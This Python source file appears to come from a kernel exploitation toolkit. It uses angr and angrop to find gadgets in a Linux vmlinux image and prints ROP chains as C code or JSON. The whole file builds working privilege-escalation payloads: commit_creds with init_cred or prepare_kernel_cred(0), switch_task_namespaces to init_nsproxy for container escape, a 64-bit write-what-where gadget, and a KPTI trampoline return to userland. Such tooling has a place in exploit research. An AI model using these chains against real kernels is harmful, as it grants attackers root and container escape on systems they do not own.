#!/usr/bin/env -S python3 -u

import argparse
import pathlib
import subprocess
import tempfile
import sys
import os

import angr
import angrop
from angrop.rop_gadget import RopGadget
from rop_instruction_patcher import RopInstructionPatcher
from rop_util import load_symbols, setup_logger
import gadget_finder
from gadget_filter import GadgetFilter

sys.path.append(os.path.abspath(f"{__file__}/../.."))
from kpwn_db.data_model.rop_chain import *
from kpwn_db.data_model.serialization import *

BIT_SIZE = 64
PREPARE_KERNEL_CRED = "prepare_kernel_cred"
COMMIT_KERNEL_CRED = "commit_creds"
INIT_CRED = "init_cred"
FIND_TASK_BY_VPID = "find_task_by_vpid"
SWITCH_TASK_NAMESPACES = "switch_task_namespaces"
PARSE_MOUNT_OPTIONS = "parse_mount_options"
KPTI_TRAMPOLINE = "swapgs_restore_regs_and_return_to_usermode"
INIT_NSPROXY = "init_nsproxy"
CORE_PATTERN = "core_pattern"
CORE_PATTERN_SIZE = 0x80
MSLEEP = "msleep"
FORK = "__do_sys_fork"
RPP_CONTEXT_SIZE = 5

ROP_C_FORMAT = "*(rop++) = {};"
ROP_REBASE_C_FORMAT = "*(rop++) = kbase + {};"

KERNEL_BASE_ADDRESS = 0xffffffff81000000

logger = setup_logger("angrop_rop_generator")


class RopGeneratorError(Exception):
    """Exception class for RopGenerator errors."""

    def __init__(self, message):
        super().__init__(message)


class RopGeneratorAngrop:
    """Generates ROP chains using angrop."""

    def __init__(self, vmlinux_path) -> None:
        """Initializes the ROP generator.

        Args:
          vmlinux_path: path to the vmlinux file
        """
        self._vmlinux_path = vmlinux_path

        # load angr on a stripped binary for speed
        with tempfile.NamedTemporaryFile(delete=True) as tmpfile:
            stripped_path = tmpfile.name
            subprocess.run(['strip', vmlinux_path, '-o',
                           stripped_path], check=True)
            self._project = angr.Project(
                stripped_path, perform_relocations=False)

        self._symbol_map = load_symbols(vmlinux_path)
        self._addr_to_symbol = {
            addr: name for name, addr in self._symbol_map.items()
        }
        # vmlinux is not marked PIE but we want the rebase option in angrop turned
        # on
        self._project.loader.main_object.pic = True
        # hack to only rebase the correct values
        self._project.loader.main_object.mapped_base = (
            self._project.loader.main_object.segments[0].vaddr
        )
        self._kpti_trampoline = self._find_kpti_trampoline()
        self._rop = self._load_angrop()

    def _find_symbol_addr(self, func_name):
        if not func_name in self._symbol_map:
            raise RopGeneratorError(f"Could not find a symbol for {func_name}")
        return self._symbol_map[func_name]

    def _find_symbol(self, func_name):
        return RopChainOffset(
          kernel_offset=self._find_symbol_addr(func_name) - KERNEL_BASE_ADDRESS,
          description=f"{func_name}()")

    def _find_symbol_name(self, addr):
        return self._addr_to_symbol.get(addr)

    def _load_angrop(self):
        rop = self._project.analyses.ROP(
            kernel_mode=True, fast_mode=False, only_check_near_rets=False, max_block_size=14)
        self._find_rop_gadgets(rop)
        return rop

    def _find_rop_gadgets(self, rop):
        """
        First finds the gadget with GadgetFinder
        Filters them with GadgetFilter
        Analyzes gadgets with angrop

        This is done to avoid the slowness of analyzing the entire kernel binary with angrop
        """
        rop_backend = gadget_finder.RppBackend(self._vmlinux_path, RPP_CONTEXT_SIZE)
        possible_gadgets = gadget_finder.find_gadgets(rop_backend)
        logger.debug("gadgets before filter: %d", len(possible_gadgets))
        gadget_filter = GadgetFilter()
        possible_gadgets = gadget_filter.filter_gadgets(possible_gadgets)
        logger.debug("gadgets after filter: %d", len(possible_gadgets))
        addresses = possible_gadgets.keys()
        rop.analyze_gadget_list(addresses)

    def _find_pop_one_reg(self, reg_name):
        """Finds a gadget that pops one register.

        Args:
          reg_name: the register to pop

        Returns:
          the gadget

        Raises:
          RopGeneratorAngropError: if no gadget is found
        """
        shortest_gadget = None

        for gadget in self._rop.rop_gadgets:
            if gadget.changed_regs == {reg_name} and gadget.popped_regs == {reg_name}:
                if (
                    shortest_gadget is None
                    or gadget.block_length < shortest_gadget.block_length
                ):
                    shortest_gadget = gadget

        if shortest_gadget:
            offs = shortest_gadget.addr - KERNEL_BASE_ADDRESS
            return RopChainOffset(kernel_offset=offs, description=f"pop {reg_name}")
        else:
            raise RopGeneratorError(
                f"No pop gadget found for the register {reg_name}"
            )

    def mov_reg_memory_writes(self):
        """
        Finds gadgets that perform 'mov rdi, rax' which contain a memory write.

        Args:
            binary_path: Path to the binary file.

        Returns:
            A list of dictionaries, where each dictionary contains the gadget and the
            address controller register for the memory write, or an empty list if none are found.
        """
        for gadget in self._rop.rop_gadgets:
            rdi_rax_found = False
            for reg_move in gadget.reg_moves:
                if reg_move.to_reg == 'rdi' and reg_move.from_reg == 'rax' and reg_move.bits == 64:
                    rdi_rax_found = True
                    break

            if not rdi_rax_found:
                continue

            if len(gadget.mem_writes) != 1:  # Check for exactly one memory write
                continue

            mem_write = gadget.mem_writes[0]  # Get the single memory write
            addr_dependencies = list(mem_write.addr_dependencies)
            addr_controllers = list(mem_write.addr_controllers)

            # Check that there's only one address dependency and it's controllable
            if len(addr_dependencies) == 1 and \
                    len(addr_controllers) == 1 and \
                    addr_dependencies[0] == addr_controllers[0]:
                controller_reg = addr_controllers[0]
                # Point memory write to the end of core_pattern as a safe place to write
                write_offset = mem_write.addr_offset
                write_to_addr = self._find_symbol_addr(
                    CORE_PATTERN) + CORE_PATTERN_SIZE - 0x8
                # Handle the write offset  ex: mov [rdi+0x10], rax
                reg_val = write_to_addr-write_offset
                kwargs = {controller_reg: reg_val}
                chain = self._rop.set_regs(**kwargs, preserve_regs=("rax",))
                chain.add_gadget(gadget)
                # Handle the stack shifts in mem_write gadget
                bytes_per_pop = self._project.arch.bytes
                for _ in range(gadget.stack_change // bytes_per_pop - 1):
                    chain.add_value(0)
                chain.print_payload_code()
                return chain

        return None

    def _mov_rdi_rax(self):
        """
        Finds mov rdi, rax gadgets. Different types of gadgets possible:
        mov rdi, rax ; mov  [rdx], ecx ; mov rax, rdi ; ret ;
        mov rdi, rax ; add rsi, 0x00000000000002F0 ; rep movsq ; ret ;
        mov rdi, rax ; mov rsi, 0xFFFFFFFF822C3B60 ; rep movsq ; pop rbp ; ret ;
        mov rdi, rax ; rep movsq ; xor eax, eax ; pop rbp ; ret ;
        """
        chain_mov_regs = None
        try:
            chain_mov_regs = self._rop.move_regs(**{"rdi": "rax"})
        except angrop.errors.RopException:
            pass
        if not chain_mov_regs:
            chain_mov_regs = self.mov_reg_memory_writes()
        if not chain_mov_regs:
            raise RopGeneratorError("Unable to find a mov rdi, rax gadget.")
        items = []
        for value, rebased in chain_mov_regs._concretize_chain_values():  # pylint: disable=protected-access
            if rebased:
                items.append(RopChainOffset(
                    kernel_offset=value - KERNEL_BASE_ADDRESS,
                    description=f"mov rdi, rax"))
            else:
                items.append(RopChainConstant(value))

        return items

    def find_memory_write(self):
        """Finds the shortest ROP gadget with a single memory write where the address is controlled by 'rsi' 
        and the data is controlled by 'rdi', writing 64 bits of data."""

        # TODO use angrop directly when issue is handled

        shortest_gadget = None

        for gadget in self._rop.rop_gadgets:
            if len(gadget.mem_writes) == 1:  # Consider only gadgets with exactly one memory write
                mem_write = gadget.mem_writes[0]

                if (
                    len(mem_write.addr_controllers) == 1
                    and 'rsi' in mem_write.addr_controllers
                    and len(mem_write.data_controllers) == 1
                    and 'rdi' in mem_write.data_controllers
                    and mem_write.data_size == 64
                ):
                    if shortest_gadget is None or gadget.block_length < shortest_gadget.block_length:
                        shortest_gadget = gadget

        if shortest_gadget:
            return shortest_gadget.addr - KERNEL_BASE_ADDRESS
        else:
            raise RopGeneratorError("No suitable memory writes found")

    def build_rop_chain(self):
        """Builds the ROP chain.

        Returns:
          Printable ROP chain

        """
        chain = self._rop.func_call(
            self._find_symbol_addr(PREPARE_KERNEL_CRED), [0]
        )
        chain += self._rop.move_regs(rdi="rax")
        chain += self._rop.func_call(
            self._find_symbol_addr(COMMIT_KERNEL_CRED), []
        )
        chain += self._rop.func_call(
            self._find_symbol_addr(FIND_TASK_BY_VPID), [1]
        )
        chain += self._rop.move_regs(rdi="rax")
        chain += self._rop.set_regs(
            rsi=self._find_symbol_addr(INIT_NSPROXY),
            preserve_regs=("rdi",)
        )
        chain += self._rop.func_call(
            self._find_symbol_addr(SWITCH_TASK_NAMESPACES), []
        )
        chain.add_gadget(RopGadget(self._kpti_trampoline))
        chain.add_value(0)
        chain.add_value(0)
        return chain

    def _find_kpti_trampoline(self):
        """Finds the address of the kPTI trampoline.

        Returns:
          The address of the kPTI trampoline.
        """

        target_addr = self._find_symbol_addr(KPTI_TRAMPOLINE)

        # step at most 4 times
        for _ in range(4):
            target_block = self._project.factory.block(target_addr)
            for ins in target_block.disassembly.insns:
                if ins.mnemonic == "mov" and "rdi, rsp" in ins.op_str:
                    # add to symbol map
                    self._symbol_map["kpti_trampoline"] = ins.address
                    self._addr_to_symbol[ins.address] = "kpti_trampoline"
                    return ins.address
            if target_block.size == 0:
                target_addr += 1
            else:
                target_addr = target_addr+target_block.size


        raise RuntimeError("didn't find kpti_trampoline")

    def payload_c_code(self, rop_chain, print_instructions=True):
        """Prints the C code for the ROP chain.

        Args:
          rop_chain: the rop chain to print
          print_instructions: whether to print the rop gadget instructions.

        Returns:
          prints the code for the rop payload
        """
        payload = ""

        concrete_vals = rop_chain._concretize_chain_values(
        )  # pylint: disable=protected-access
        for value, rebased in concrete_vals:

            instruction_code = ""
            if print_instructions:
                sec = self._project.loader.find_section_containing(value)
                if sec and sec.is_executable:
                    symbol_name = self._find_symbol_name(value)
                    if symbol_name:
                        asmstring = symbol_name
                    else:
                        asmstring = angrop.rop_utils.addr_to_asmstring(
                            self._project, value)
                    if asmstring:
                        instruction_code = "\t// " + asmstring

            if rebased:
                # Get the base address from the first segment
                value -= self._project.loader.main_object.segments[0].vaddr
                payload += ROP_REBASE_C_FORMAT.format(
                    hex(value)) + instruction_code
            else:
                payload += ROP_C_FORMAT.format(hex(value)) + instruction_code
            payload += "\n"

        # add the user variables
        payload += ROP_C_FORMAT.format(
            "/* TODO: put userspace function name here */"
        )
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved cs variable name here*/")
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved rflags variable name here*/"
        )
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved stack pointer variable name here*/"
        )
        payload += "\n"
        payload += ROP_C_FORMAT.format(
            "/* TODO: put saved ss variable name here*/")
        payload += "\n"

        return payload

    def rop_action_msleep(self, msecs: RopChainConstant | RopChainArgument):
        """Constructs a ROP chain to trigger a sleep for the specified milliseconds.

        Args:
            msecs: The number of milliseconds to sleep for.

        Returns:
            RopChain: The constructed ROP chain to execute the `msleep` function.
        """
        return RopAction(
          type_id=0x01,
          description="msleep(ARG_time_msec)",
          gadgets=[
            self._find_pop_one_reg("rdi"),
            msecs,
            self._find_symbol(MSLEEP),
        ])

    def rop_action_commit_creds(self):
        """Constructs a ROP action to commit creds.

        Returns:
            RopChain: The constructed ROP chain.
        """
        items = [
            self._find_pop_one_reg("rdi"),
            self._find_symbol(INIT_CRED),
            self._find_symbol(COMMIT_KERNEL_CRED)
        ]

        return RopAction(
          type_id=0x02,
          description="commit_kernel_cred(prepare_kernel_cred(0))",
          gadgets=items)

    def rop_action_switch_task_namespaces(self, vpid: RopChainConstant | RopChainArgument):
        """Constructs a ROP action to call fswitch_task_namespaces.

        Returns:
            RopChain: The constructed ROP chain.
        """
        items = [
            self._find_pop_one_reg("rdi"),
            vpid,
            self._find_symbol(FIND_TASK_BY_VPID),
        ]

        items.extend(self._mov_rdi_rax())
        items.extend([
            self._find_pop_one_reg("rsi"),
            self._find_symbol(INIT_NSPROXY),
        ])
        items.append(self._find_symbol(SWITCH_TASK_NAMESPACES))

        return RopAction(
          type_id=0x03,
          description="switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)",
          gadgets=items)

    def rop_action_ret_via_kpti_retpoline(
        self,
        user_rip: RopChainArgument,
        user_cs: RopChainArgument,
        user_rflags: RopChainArgument,
        user_sp: RopChainArgument,
        user_ss: RopChainArgument,
    ):
        """Constructs a kpti trampoline rop chain.

        Returns:
            RopChain: The constructed ROP chain.
        """
        return RopAction(
          type_id=0x07,
          description="ret_via_kpti_retpoline(ARG_user_rip, ARG_user_cs, ARG_user_rflags, ARG_user_sp, ARG_user_ss)",
          gadgets=[
            RopChainOffset(
              kernel_offset=self._kpti_trampoline - KERNEL_BASE_ADDRESS,
              description="kpti_trampoline()"),
            RopChainConstant(0),
            RopChainConstant(0),
            user_rip,
            user_cs,
            user_rflags,
            user_sp,
            user_ss,
        ])

    def rop_action_fork(self):
        """Constructs a fork rop chain.

        Returns:
            RopChain: The constructed ROP chain.
        """
        return RopAction(
          type_id=0x05,
          description="fork()",
          gadgets=[self._find_symbol(FORK)])

    def rop_action_telefork(self, msecs: RopChainConstant | RopChainArgument):
        """Constructs a telefork rop chain.
        Used to return to userland from kernel

        Returns:
            RopChain: The constructed ROP chain.
        """
        items = [self._find_symbol(FORK),
                 self._find_pop_one_reg("rdi"),
                 msecs,
                 self._find_symbol(MSLEEP),
                ]

        return RopAction(
          type_id=0x06,
          description="telefork(ARG_sleep_msec)",
          gadgets=items)

    def rop_action_write_what_where_64(self, address, value):
        """Constructs a rop chain to write a 64 bit value to an address.

        Returns:
           RopChain: The constructed ROP chain.
        """
        items = [self._find_pop_one_reg("rdi"),
                 value,
                 self._find_pop_one_reg("rsi"),
                 address,
                 RopChainOffset(
                   kernel_offset=self.find_memory_write(),
                   description="mov qword ptr [rsi], rdi")]

        return RopAction(
          type_id=0x04,
          description="write_what_where_64(ARG_address, ARG_new_value)",
          gadgets=items)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generates ROP payloads for linux kernel images"
    )
    parser.add_argument("vmlinux_path", help="Path to vmlinux file")
    parser.add_argument("--output", choices=["python", "json"], default="python")
    parser.add_argument("--json-indent", type=int, default=None)
    args = parser.parse_args()

    patched_vmlinux_path = pathlib.Path(
        args.vmlinux_path
    ).with_suffix(".thunk_replaced")

    if not patched_vmlinux_path.exists():
        RopInstructionPatcher(args.vmlinux_path).apply_patches(patched_vmlinux_path)

    rop_generator = RopGeneratorAngrop(patched_vmlinux_path)
    action_sleep = rop_generator.rop_action_msleep(RopChainArgument(0))
    action_commit_creds = rop_generator.rop_action_commit_creds()
    action_switch_task_namespace = rop_generator.rop_action_switch_task_namespaces(RopChainArgument(0))
    action_write_what_where_64 = rop_generator.rop_action_write_what_where_64(
        RopChainArgument(0), RopChainArgument(1))
    action_fork = rop_generator.rop_action_fork()
    action_telefork = rop_generator.rop_action_telefork(RopChainArgument(0))
    action_trampoline_ret = rop_generator.rop_action_ret_via_kpti_retpoline(
      RopChainArgument(0), RopChainArgument(1), RopChainArgument(2),
      RopChainArgument(3), RopChainArgument(4))

    if args.output == "json":
        print(to_json([
            action_sleep,
            action_commit_creds,
            action_switch_task_namespace,
            action_write_what_where_64,
            action_fork,
            action_telefork,
            action_trampoline_ret,
        ], args.json_indent, RopActions))
    else:
        chain = rop_generator.build_rop_chain()
        payload_code = rop_generator.payload_c_code(chain)
        print(payload_code)
        print("\n")
        print("sleep\n" + repr(action_sleep) + '\n\n')
        print("Commit Creds\n" + repr(action_commit_creds) + '\n\n')
        print("Switch task Namepspace\n" +
              repr(action_switch_task_namespace) + '\n\n')
        print("Write What Where (64 bits)\n" +
              repr(action_write_what_where_64) + '\n\n')
        print("Fork\n" + repr(action_fork) + '\n\n')
        print("Telefork\n" + repr(action_telefork) + '\n\n')
        print("Trampoline Ret\n" + repr(action_trampoline_ret) + '\n\n')